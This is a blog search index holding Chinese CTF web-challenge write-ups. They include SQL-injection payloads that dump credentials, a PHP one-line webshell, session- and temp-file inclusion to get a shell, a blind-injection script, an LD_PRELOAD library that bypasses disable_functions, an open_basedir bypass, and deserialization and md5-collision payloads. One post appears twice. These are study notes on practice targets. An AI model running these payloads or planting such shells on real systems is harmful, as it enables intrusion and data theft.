<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[i春秋ctf(4)]]></title>
    <url>%2F2020%2F01%2F12%2Fi%E6%98%A5%E7%A7%8Bctf(4)%2F</url>
    <content type="text"><![CDATA[[“百度杯”CTF比赛 十二月场] Blog题目页面:注册用户,登入后再发布文章处发现了sql注入漏洞加了个’,发现插入失败在构造语句,发现插入成功,但是没有显示在文章页面上显示不到文章页面是因为,最后一个字段的因数,最后一个字段是记录用户名的,我这里创建的是test,变成test就可以插入成功了猜测的字段分别是id,标题,内容,用户名然后分别构造如下payload,得到admin密码表名 1title=test&amp;content=test&apos;,&apos;tesat&apos;),(&apos;test&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;222 列名 1title=test&amp;content=test&apos;,&apos;tesat&apos;),(&apos;test&apos;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&apos;users&apos;),&apos;222 用户名密码 1title=test&amp;content=test&apos;,&apos;tesat&apos;),(&apos;test&apos;,(select group_concat(username,password) from users),&apos;222 然后访问文章页面,就可以看到admin的密码了md5解密得到melody123,然后访问文章的时候,看见url有点像文件包含,包含flag.php(flag.php会在robots.txt中看到)得到base64加密的源码,解码得到flag [“百度杯”CTF比赛 十二月场] Blog·进阶篇步骤和blog上面一样,先得到管理员密码19-10-1997,因为在他发布文章那里查看源码的时候发现是kindeditor编辑器查了一下kindeditor编辑器的漏洞,发现有个列目录漏洞http://878685f89f024d558bbd8e1183466b15962732e681794f5f.changame.ichunqiu.com/kindeditor/php/file_manager_json.php?path=../那这样就有思路了,因为有列目录漏洞我们可以看tmp目录下的文件内容,然后还有一个点就是我们主要文件上传那么久会生成一个临时文件,然后程序运行完成后就会删掉,因为程序速度够快所以一般难发现,还有就是这里还存在文件包含的漏洞,但是不可以用php://伪协议,如果我们自己包含自己,那么程序就会进入死循环,进入死循环,因为无限的包含我们的自己,会导致程序崩溃,无法删除我们的文件,做法1.先写一个文件上传的代码,上传文件2.然后利用kindeditor列目录漏洞去查看文件名3.然后文件包含我们生成的临时文件,然后就可以getshell了 第一个步文件上传 1234567891011121314&lt;html&gt;&lt;head&gt;&lt;meta charset="gbk"&gt;&lt;/head&gt;&lt;body&gt;&lt;form action="http://878685f89f024d558bbd8e1183466b15962732e681794f5f.changame.ichunqiu.com/blog_manage/manager.php?module=manager&amp;name=php" method="post" enctype="multipart/form-data"&gt; &lt;label for="file"&gt;文件名：&lt;/label&gt; &lt;input type="file" name="file" id="file"&gt;&lt;br&gt; &lt;input type="submit" name="submit" value="提交"&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 一句话木马 1eval($_GET[0]); 然后上传内容是我们的一句话木马,上传后就会一直转圆圈(过个10秒后就不会被删了),然后在去访问tmp的临时路径http://878685f89f024d558bbd8e1183466b15962732e681794f5f.changame.ichunqiu.com/kindeditor/php/file_manager_json.php?path=../../../../../tmp/可以看到了上传的文件名,然后我们去包含此文件,然后传入一个phpinfo();可以看见包含成功,然后去查看phpinfo();的时候看见禁用了系统执行函数,我们用show_source读取flag [“百度杯”CTF比赛 十二月场]notebook题目页面:(题目有个小提示,用文件包含)在查看robots.txt的时候那里有个php1nFo.php字符串,访问php1nFo.php是phpinfo()的内容,然后测试首页的文件包含,来尝试包含robots.txt文件试试可以发现包含成功,因为session文件默认命名是sess_然后是此处会话的PHPSESSID。例如我这里的session文件名就是sess_k82v64s2oahgo5ea4a41c37036,那就差路径了,这里简单讲讲坑,我们直接访问php1nFo.php查看里面的session.save_path,里面的/var/lib/php5其实是假的,他在登入页面会重新设置session的文件,所以我们用首页去包含php1nFo.php文件获取session路径可以看见/tmp/SESS路径里面,然后我们的session的绝对路径是/tmp/SESS/sess_k82v64s2oahgo5ea4a41c37036,猜测用户名的值作为session存储的,那我们创建一个用户&lt;?php eval($_GET[0]); ?&gt;,登入后会记录session的值,然后我们就可以用文件包含去包含session文件phpinfo执行成功,没有禁用系统执行函数,直接查看flag就可以了]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋ctf(3)]]></title>
    <url>%2F2020%2F01%2F10%2Fi%E6%98%A5%E7%A7%8Bctf(3)%2F</url>
    <content type="text"><![CDATA[[第一届”百度杯”]Upload打开题目:他说你要快一点,在http头发现flag标志和要我们用post提交ichunqiu参数这肯定要写脚本来跑 12345678910111213import requestsimport base64url = 'http://2563028b3cdb4a5896cfb551bb856dde7279e4e044b84101.changame.ichunqiu.com/'s = requests.session()res = s.get(url)flag = base64.b64decode(res.headers['flag'].encode('utf-8')).decode('utf-8')flag = flag.split(":")[1].strip()flag = base64.b64decode(flag.encode('utf-8')).decode('utf-8')data = &#123;"ichunqiu":flag&#125;proxies = &#123;'http':'http://127.0.0.1:8080'&#125;res = s.post(url,data=data)print(res.text) 得到一个路径,然后访问后,点击按钮得到一个登入框md5爆破脚本 12345678&lt;?phpfor($i=0;$i&lt;10000000000;$i++)&#123; if(substr(md5($i),0,6)=='bc9989')&#123; print($i."\n"); break; &#125;&#125;?&gt; 得到验证码后,进行了sql注入,弱密码,都没有结果,最后看别人wp知道原来还有个文件泄露http://2563028b3cdb4a5896cfb551bb856dde7279e4e044b84101.changame.ichunqiu.com/3712901a08bb58557943ca31f3487b7d/.svn/wc.db访问后可以说已经得到用户名了,md5加密后的值8638d5263ab0d3face193725c23ce095密码是123登入后看到弹框又给了个路径http://2563028b3cdb4a5896cfb551bb856dde7279e4e044b84101.changame.ichunqiu.com/3712901a08bb58557943ca31f3487b7d/7815696ecbf1c96e6894b779456d330e.php访问后得到一个上传页面,修改Content-Type和文件名,得到flag [百度杯”CTF比赛 2017 二月场]Zone打开页面说你没有登入,打开cookie,发现有个login的值为0改成1就登入成功,登入后点击Manage查看请求参数有点类似文件包含,然后在扫描目录时发现flag.php,尝试包含包含成功,然后在尝试用php://伪协议的时候发现包含失败,且测试过程中把../替换为了空然后包含/etc/passwd成功因为访问404页面的时候发现是nginx,尝试包含配置文件发现他包含了另外一个文件,继续包含他开了autoindex目录浏览功能访问online-movies发现确实有,不过文件都在是一个目录访问urlhttp://74cf9dff47ac42f6ab205e22dd6bd2796d48a4cfbc9b4398.changame.ichunqiu.com/online-movies../,下载/var/www/html/目录里面的flag.phphttp://74cf9dff47ac42f6ab205e22dd6bd2796d48a4cfbc9b4398.changame.ichunqiu.com/online-movies../var/www/html/flag.php不可以通过按钮点html因为点进html的话会下载其他html文件访问url下载flag.php拿到flag [“百度杯”CTF比赛 2017 二月场]include打开页面就是一个显眼的phpinfo代码很简单包含我们传入的path参数的值,在phpinfo()提取到可用的信息,allow_url_include开启了,可以直接命令执行查看dle345aae.php得到flag]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋ctf(2)]]></title>
    <url>%2F2020%2F01%2F09%2Fi%E6%98%A5%E7%A7%8Bctf(2)%2F</url>
    <content type="text"><![CDATA[[2017广东省强网杯]who are you?打开页面:页面显示没有权限,一般说没权限基本上都可以看看cookie,发现cookie有一串base64加密,解密后的内容f:5:&quot;thrfg&quot;;其实感觉有点奇怪,然后修改thrfg变成admin,在base64加密,显示还是权限拒绝,然后经过发现其实还有一次加密rot13把base64解密后的内容进行rot13解密得到s:5:&quot;guest&quot;;然后把guest变成admin,然后进行rot13加密再base64加密变成Zjo1OiJucXp2YSI7可以看到注释的内容,其实他就是让我们传入文件名,和文件的内容。在尝试传入php文件是ok的,但是在传入文件内容的时候有&lt;就会被过滤,拦截下来,最后看了别人的wp才知道,原来这里有可能是用file_put_contents函数来写入文件的,然后此函数支持传入数组内容,最后payload变成访问后获取flag [2017广东省强网杯]broken打开页面的链接:发现一推符号,不过这些符号一看就知道是jsfuck加密,把他复制到浏览器console控制台,运行后发现有报错他说有未闭合的符号,尝试闭合,看到前面有2个[[,有可能是这里没有闭合,把他们变成[][然后他会弹出一个框框说flag不在这里,尝试不执行代码,看看他是什么东西,去掉最后面的() [第三届“百越杯”] Do you know upload？打开页面:上传php木马,更改Content-Type变成image/jpeg上传成功,我用冰蝎连接,在文件中没有找到flag文件,但是看到一个config.php,猜测flag在数据库里面然后连接数据库,select * from flag;,拿到flag [圣诞活动赛题]SQLi打开页面一波SQL注入搞,但是并没有什么卵用,一开始以为过滤了什么,找找源码。发现也没有,然后在FUZZ的时候发现了%有点异常,他报错了看到sprintf,百度了一波发现了格式化漏洞,因为在格式化填充的时候%\和%$\会变替换为空,我们输入%$’经过addslasches的时候会变成%$&#39;但是在sprintf就会变成’因为%$\会被替换为空具体参考下面参考链接然后构造的payloadusername=admin%1$&#39; and 1=1#&amp;password=a密码错误用户名错误根据他回显的信息可以知道是一个布尔盲注。写脚本跑就可以了 import requests import string string = string.printable url = "http://73728a8e3b884fb8b274b91b856c58c0a640def1b46840b1.changame.ichunqiu.com/" flag = '' proxies={'http':'http://127.0.0.1:8080'} n = 0; for i in range(1,45): for s in string: """ 数据表 data= { 'username':"admin%1$' and {0}=ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{1},1))#".format(ord(s),i), 'password':'a', } 列 data= { 'username':"admin%1$' and {0}=ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),{1},1))#".format(ord(s),i), 'password':'a', } """ data= { 'username':"admin%1$' and {0}=ascii(substr((select group_concat(flag) from flag),{1},1))#".format(ord(s),i), 'password':'a', } response = requests.post(url,data=data,proxies=proxies).text if(response.find('password error!')!=-1): n = len(flag) flag += s print(flag) if(n==len(flag)): exit(0) break]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ctf练习(5)]]></title>
    <url>%2F2020%2F01%2F07%2Fctf%E7%BB%83%E4%B9%A0(5)%2F</url>
    <content type="text"><![CDATA[[安洵杯 2019]easy_serialize_php点开页面的链接发现源码 把$_SESSION[&#39;user&#39;]赋值为guest,把我们传入的f参数赋值给$_SESSION[&#39;function&#39;],然后把传入的POST请求变成变量,然后判断是否有img_path参数,如果img_path有值就对$_GET[&#39;img_path&#39;]进行base64和sha1加密,如果没有就进行base64加密。然后对session进行序列化然后进行过滤,然后判断function的值然后进行对应的操作看到eval(‘phpinfo()’)那里有个注释说,这里可能有你想找的一些东西。先查看phpinfo()的内容发现有个d0g3_f1ag.php文件,猜测里面有flag,所以我们只要让file_get_contents函数读取d0g3_f1ag.php文件即可,因为他先对我们的session进行了序列化,然后再进行过滤,最后在进行反序列化的,且他把一些特定的字符替换为了空,我们可以通过构造这样的payload读取flag 1SESSION[user]=phpphpphpphpphpphpflag&amp;_SESSION[function]=;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;1&quot;;s:2:&quot;aa&quot;;&#125;&amp;function=show_image 可以看到得到了flag如果按照此题目没有任何过滤的话,序列化后的payload是这样的 1a:3:&#123;s:4:&quot;user&quot;;s:22:&quot;phpphpphpphpphpphpflag&quot;;s:8:&quot;function&quot;;s:57:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;1&quot;;s:2:&quot;aa&quot;;&#125;&quot;;s:5:&quot;&apos;img&apos;&quot;;s:13:&quot;guest_img.png&quot;;&#125; 可是因为他过滤了把php和flag等等的关键字都替换为了空,所以他序列化后的payload是这样的 1a:3:&#123;s:4:&quot;user&quot;;s:22:&quot;&quot;;s:8:&quot;function&quot;;s:57:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;1&quot;;s:2:&quot;aa&quot;;&#125;&quot;;s:5:&quot;&apos;img&apos;&quot;;s:13:&quot;guest_img.png&quot;;&#125; 在反序列化的时候会根据s:xx:&quot;string&quot;,那个xx代表了有多少个字符,到了xx的长度后就会读取下一个s:xx:&quot;string&quot;,像上面的s:22:&quot;&quot;;s:8:&quot;function&quot;;s:57:&quot;这里其实反序列化解析后字符串的内容是&quot;;s:8:&quot;function&quot;;s:57:,而不是空,通过只要的方法构造payload,最后因为反序列化时读取到;}就会认为是结尾,所以payload可以成功 [GWCTF 2019]我有一个数据库打开页面(乱码的话替换字符编码就行):他说他有个数据库,猜测是备份数据库扫描,然后丢去目录爆破,备份文件没有发现,发现了有phpmyadmin版本4.8.1,存在文件包含直接获取flag,payload 1?target=user_password.php%253f/../../../../../../../../flag [GWCTF 2019]枯燥的抽奖打开页面提交答案,然后拦截数据包。发现check.php,访问后发现代码可以看见他对我们的$_SESSION[&#39;seed&#39;]随机赋了个值,然后利用这个值设置随机数种子,然后循环20次得到1串随机字符,然后他给了我们10位随机字符,要我们猜后面10位。只要我们后面10位字符串对了就可以获得flag。只要知道随机种子,他生成的值就会变成固定的值,我们就可以预测他下次出现的值。这里要用到php_mt_seed工具,所以先写个脚本把前10个字符,变成该工具对应的格式 12345678910str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'str2='ROOibPA2qJ'str3 = str1[::-1]res=''for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' ' breakprint res 得到随机种子,然后修改一下源代码将我们的获取到的种子放到mt_srand参数里面 123456789101112&lt;?phpheader(&quot;Content-Type: text/html;charset=utf-8&quot;);session_start();mt_srand(144857701);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&apos;&apos;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123; $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125;echo $str; 最好用php7.0左右的版本来运行脚本,不同版本可能生成的不一样提交获取flag]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ctf练习(4)]]></title>
    <url>%2F2020%2F01%2F07%2Fctf%E7%BB%83%E4%B9%A0(4)%2F</url>
    <content type="text"><![CDATA[Babyblog打开页面是个登入框有注册页面在注册时发现有验证码,要写脚本跑脚本如下: 12345678&lt;?phpfor($verify=0; $verify&lt;10000000;$verify++)&#123; if(substr(md5($verify),0,5)=='75609')&#123; print($verify); break; &#125;&#125;?&gt; 得到验证码就可以注册了登入成功后发现也做不了什么,没有发现比较明显的漏洞,其中可疑的地方就说replace功能不给用(权限不够),显然这个地方有问题,replace让人想起php的preg_replace这个漏洞,然后扫描了一下看看是否有源码,发现了www.zip通过代码审计发现了二次注入,在edit.php处直接把查询出来的title放到了sql语句中。注入思路:1.通过writing.php的title参数写入payload2.在通过edit.php出触发我们的payload但是在config.php中对我们的传入的参数进行了过滤因为PDO在5.3以上是支持联合查询的我们用联合查询去绕过(在http头可以看到php版本)。因为replace功能不可用然后看了看relpace.php发现要isvip为1才可用因为php5.3版本是存在%00截断的,我们可以通过截断插入/e,然后去执行任意代码。解题思路:1.通过二次注入更改权限2.在replace功能出使用00截断,执行任意代码 首先在writing.php出的title出插入payload1&#39;;SET @p=0x757064617465207573657273207365742069737669703d313b;PREPARE test FROM @p;EXECUTE test;#然后去该文章的edit功能出触发payload(可以不用修改,点击Submit后会直接触发的)然后去replace功能出会发现可以使用了然后就可以进行rce了,因为代码中要求$_POST[&#39;regex&#39;] == &#39;1&#39;才会使用pret_replace所以我们还要加入参数就可以了可以发现命令是执行成功了,因为有js影响的原因不是太好操作,可以选择禁用js执行或者写入一个shell访问shell,执行phpinfo()函数后发现设置了open_basedir和disable_functions绕过open_basedir可以用P神脚本,我这里把他变成了一行,方便操作 123456789101112131415161718&lt;?phpprintf('&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;', ini_get('open_basedir'));$file_list = array();// normal files$it = new DirectoryIterator("glob:///*");foreach($it as $f) &#123; $file_list[] = $f-&gt;__toString();&#125;// special files (starting with a dot(.))$it = new DirectoryIterator("glob:///.*");foreach($it as $f) &#123; $file_list[] = $f-&gt;__toString();&#125;sort($file_list);foreach($file_list as $f)&#123; echo "&#123;$f&#125;&lt;br/&gt;";&#125;?&gt; 可以看见目录被列举出来了,可以看到根目录下有2个文件一个是flag,一个是readflag,一般都是要我们执行readflag才可以执行查看flag文件。绕过disable_functions执行系统函数,因为禁用函数中没有禁用error_log()可以利用这个函数来执行系统命令。先编译.so文件 12345678910#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;extern char** environ;int geteuid ()&#123; unsetenv("LD_PRELOAD"); system("/readflag &gt; a.txt");&#125; 然后用gcc编译gcc -shared -fPIC test.c -o test.so上传后用shell.php执行函数从而执行我们的命令 12putenv("LD_PRELOAD=./test.so");error_log("test",1,"",""); 查看a.txt发现了他需要我们计算然后才会给我们flag,此处因为proc_open函数被禁用了,反弹shell也失败,一点办法都没有然后看了大佬的wp发现他是用perl语言写的 12345678910111213141516171819use strict;use IPC::Open3;my $pid = open3( \*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, '/readflag' ) or die "open3() failed $!";my $r;$r = &lt;CHLD_OUT&gt;;print "$r";$r = &lt;CHLD_OUT&gt;;print "$r";$r = eval "$r";print "$r\n";print CHLD_IN "$r\n";$r = &lt;CHLD_OUT&gt;;print "$r";$r = &lt;CHLD_OUT&gt;;print "$r";open(FILE,"&gt;/var/www/html/flag.txt");syswrite(FILE,"$r");close(FILE); 然后更改c代码 12345678910#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;extern char** environ;int geteuid ()&#123; unsetenv("LD_PRELOAD"); system("perl test.pl");&#125; 把c编译为so文件后,然后把so文件和test.pl上传上去,然后在发送一次请求访问flag.txt得到flag [ZJCTF 2019]NiZhuanSiWei题目页面:简单的审计知道要达到3个条件可以进行文件包含,因为有个unserialize猜测是反序列化,然后注释那里写个个php文件,useless.php得到flag思路:1.利用文件包含,得到useless.php的源码,然后进行构造序列化2.构造的序列化后传入payload应该就可以获得flag了首先要获取源码,要达到文件包含,就要满足几个条件1.我们传入的$_GET[&quot;text&quot;]要让函数file_get_contents的返回值是”welcome to the zjctf”2.$_GET[&quot;file&quot;]里面不可以有flag字符串解决方法:1.利用php://input伪协议绕过,第一个条件2.第二个条件可以不用绕,因为我们是获取useless.php的源码,利用php://伪协议获取源码构造如下包base64解码后得到源码 1234567891011121314&lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("U R SO CLOSE !///COME ON PLZ"); &#125; &#125; &#125;?&gt; 这里我们只要把$file赋值位flag.php就可以了,因为要触发Flag类里面的tostring函数才可以读取文件,要触发tostring要有字符串处理函数,刚好题目那里有个echo $password这条语句,就可以触发了。所以payload是O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}构造如下包,获取flag [SWPU2019]Web1打开是个登入页面:一波测试后发现没什么东西,注册个用户在里面测试发现二次注入,先申请广告然后去广告详情看见mysql报错经过测试过滤了空格,or,and,updatexml等等函数,猜测一下有用字段,构造payload1&#39;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22发现2和3是可以爆出数据的,因为过滤了or所以用不了information_schema数据库,所以要绕过,博主没有绕过去是考猜的猜测为users表。看了别人wp发现其实阔以绕利用mysql数据库的innodb_table_stats表构造payload1&#39;union/**/select/**/1,(select/**/group_concat(table_name)from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22然后就是无列名获取数据了payload&#39;/**/union/**/select/**/1,group_concat((select/**/group_concat(c)/**/from/**/(select/**/1,2,3/**/c/**/union/**/select/**/*/**/from/**/users)b)),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22 参考链接https://mariadb.com/kb/en/mysqlinnodb_table_stats/ [安洵杯 2019]easy_web题目页面:看到题目的img参数猜测是加密过的,加密方法1.16进制加密2.base64加密2次解码他加密的文件名是555.png,然后图片内容是经过base64加密的,这里猜测他可能存在文件包含,我们去包含index.php测试一下payloadTmprMlpUWTBOalUzT0RKbE56QTJPRGN3得到源码 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header('content-type:text/html;charset=utf-8');$cmd = $_GET['cmd'];if (!isset($_GET['img']) || !isset($_GET['cmd'])) header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=');$file = hex2bin(base64_decode(base64_decode($_GET['img'])));$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);if (preg_match("/flag/i", $file)) &#123; echo '&lt;img src ="./ctf3.jpeg"&gt;'; die("xixi～ no flag");&#125; else &#123; $txt = base64_encode(file_get_contents($file)); echo "&lt;img src='data:image/gif;base64," . $txt . "'&gt;&lt;/img&gt;"; echo "&lt;br&gt;";&#125;echo $cmd;echo "&lt;br&gt;";if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i", $cmd)) &#123; echo("forbid ~"); echo "&lt;br&gt;";&#125; else &#123; if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) &#123; echo `$cmd`; &#125; else &#123; echo ("md5 is funny ~"); &#125;&#125;?&gt;&lt;html&gt;&lt;style&gt; body&#123; background:url(./bj.png) no-repeat center center; background-size:cover; background-attachment:fixed; background-color:#CCCCCC;&#125;&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 代码审计过后,我们要满足一下条件就可以达到命令执行1.$_GET[&#39;cmd&#39;]不可以出现正则表达式里面的内容2.并且$_POST[&#39;a&#39;]和$_POST[&#39;b&#39;]的2个数不可以相同,但是md5值要一样(不存在弱类型比较)解决条件2的方法是md5碰撞利用fastcoll_v1.0.0.5.exe工具生成一样的md5值然后用url编码加密文件内容把那串url编码分别传个a和b就可以执行命令了a=%06%11%40%27%91q%F9%DC%25%0F%1AX%D3%B2%8B%0C%B9%BC%FA%A3%D7%D9%BBH%16%F2x%29%D05%A8x%F7%AD%0D%C8hh%89%CD%EB%FFrC%C55%BC%91%8F%D7%23%AE%B1q%8DU%20-%F4v%B0%03%AD%07z%EF%9FL%BF%0A%E6%12G%21%95%D6G%B6%AD%CA%A9%95%23%97t%5B%82%FF%AD%C5%10O%B7_%88%B7%D7u%26%F4%97%86%0F%FE%F4C%CC%3B%3C%10%EBW%00%D7W%13%01%B0%A6%AD%D3%B7%F4%9E%F7sYo&amp;b=%06%11%40%27%91q%F9%DC%25%0F%1AX%D3%B2%8B%0C%B9%BC%FA%23%D7%D9%BBH%16%F2x%29%D05%A8x%F7%AD%0D%C8hh%89%CD%EB%FFrC%C5%B5%BC%91%8F%D7%23%AE%B1q%8DU%20-%F4%F6%B0%03%AD%07z%EF%9FL%BF%0A%E6%12G%21%95%D6G%B6%AD%CA%A9%95%23%17t%5B%82%FF%AD%C5%10O%B7_%88%B7%D7u%26%F4%97%86%0F%FE%F4C%CC%3B%3C%90%EAW%00%D7W%13%01%B0%A6%AD%D3%B7%F4%1E%F7sYo可以看到命令执行成功,用dir命令在根目录发现flag,然后可以用\符号来分割我们的命令,这样就可以绕过正则payloadc\at /flag]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ctf练习(4)]]></title>
    <url>%2F2020%2F01%2F04%2F2019ByteCTF%E5%A4%8D%E7%9B%98%2F</url>
    <content type="text"><![CDATA[Babyblog打开页面是个登入框有注册页面在注册时发现有验证码,要写脚本跑脚本如下: 12345678&lt;?phpfor($verify=0; $verify&lt;10000000;$verify++)&#123; if(substr(md5($verify),0,5)=='75609')&#123; print($verify); break; &#125;&#125;?&gt; 得到验证码就可以注册了登入成功后发现也做不了什么,没有发现比较明显的漏洞,其中可疑的地方就说replace功能不给用(权限不够),显然这个地方有问题,replace让人想起php的preg_replace这个漏洞,然后扫描了一下看看是否有源码,发现了www.zip通过代码审计发现了二次注入,在edit.php处直接把查询出来的title放到了sql语句中。注入思路:1.通过writing.php的title参数写入payload2.在通过edit.php出触发我们的payload但是在config.php中对我们的传入的参数进行了过滤因为PDO在5.3以上是支持联合查询的我们用联合查询去绕过(在http头可以看到php版本)。因为replace功能不可用然后看了看relpace.php发现要isvip为1才可用因为php5.3版本是存在%00截断的,我们可以通过截断插入/e,然后去执行任意代码。解题思路:1.通过二次注入更改权限2.在replace功能出使用00截断,执行任意代码 首先在writing.php出的title出插入payload1&#39;;SET @p=0x757064617465207573657273207365742069737669703d313b;PREPARE test FROM @p;EXECUTE test;#然后去该文章的edit功能出触发payload(可以不用修改,点击Submit后会直接触发的)然后去replace功能出会发现可以使用了然后就可以进行rce了,因为代码中要求$_POST[&#39;regex&#39;] == &#39;1&#39;才会使用pret_replace所以我们还要加入参数就可以了可以发现命令是执行成功了,因为有js影响的原因不是太好操作,可以选择禁用js执行或者写入一个shell访问shell,执行phpinfo()函数后发现设置了open_basedir和disable_functions绕过open_basedir可以用P神脚本,我这里把他变成了一行,方便操作 123456789101112131415161718&lt;?phpprintf('&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;', ini_get('open_basedir'));$file_list = array();// normal files$it = new DirectoryIterator("glob:///*");foreach($it as $f) &#123; $file_list[] = $f-&gt;__toString();&#125;// special files (starting with a dot(.))$it = new DirectoryIterator("glob:///.*");foreach($it as $f) &#123; $file_list[] = $f-&gt;__toString();&#125;sort($file_list);foreach($file_list as $f)&#123; echo "&#123;$f&#125;&lt;br/&gt;";&#125;?&gt; 可以看见目录被列举出来了,可以看到根目录下有2个文件一个是flag,一个是readflag,一般都是要我们执行readflag才可以执行查看flag文件。绕过disable_functions执行系统函数,因为禁用函数中没有禁用error_log()可以利用这个函数来执行系统命令。先编译.so文件 12345678910#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;extern char** environ;int geteuid ()&#123; unsetenv("LD_PRELOAD"); system("/readflag &gt; a.txt");&#125; 然后用gcc编译gcc -shared -fPIC test.c -o test.so上传后用shell.php执行函数从而执行我们的命令 12putenv("LD_PRELOAD=./test.so");error_log("test",1,"",""); 查看a.txt发现了他需要我们计算然后才会给我们flag,此处因为proc_open函数被禁用了,反弹shell也失败,一点办法都没有然后看了大佬的wp发现他是用perl语言写的 12345678910111213141516171819use strict;use IPC::Open3;my $pid = open3( \*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, '/readflag' ) or die "open3() failed $!";my $r;$r = &lt;CHLD_OUT&gt;;print "$r";$r = &lt;CHLD_OUT&gt;;print "$r";$r = eval "$r";print "$r\n";print CHLD_IN "$r\n";$r = &lt;CHLD_OUT&gt;;print "$r";$r = &lt;CHLD_OUT&gt;;print "$r";open(FILE,"&gt;/var/www/html/flag.txt");syswrite(FILE,"$r");close(FILE); 然后更改c代码 12345678910#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;extern char** environ;int geteuid ()&#123; unsetenv("LD_PRELOAD"); system("perl test.pl");&#125; 把c编译为so文件后,然后把so文件和test.pl上传上去,然后在发送一次请求访问flag.txt得到flag [ZJCTF 2019]NiZhuanSiWei题目页面:简单的审计知道要达到3个条件可以进行文件包含,因为有个unserialize猜测是反序列化,然后注释那里写个个php文件,useless.php得到flag思路:1.利用文件包含,得到useless.php的源码,然后进行构造序列化2.构造的序列化后传入payload应该就可以获得flag了首先要获取源码,要达到文件包含,就要满足几个条件1.我们传入的$_GET[&quot;text&quot;]要让函数file_get_contents的返回值是”welcome to the zjctf”2.$_GET[&quot;file&quot;]里面不可以有flag字符串解决方法:1.利用php://input伪协议绕过,第一个条件2.第二个条件可以不用绕,因为我们是获取useless.php的源码,利用php://伪协议获取源码构造如下包base64解码后得到源码 1234567891011121314&lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("U R SO CLOSE !///COME ON PLZ"); &#125; &#125; &#125;?&gt; 这里我们只要把$file赋值位flag.php就可以了,因为要触发Flag类里面的tostring函数才可以读取文件,要触发tostring要有字符串处理函数,刚好题目那里有个echo $password这条语句,就可以触发了。所以payload是O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}构造如下包,获取flag 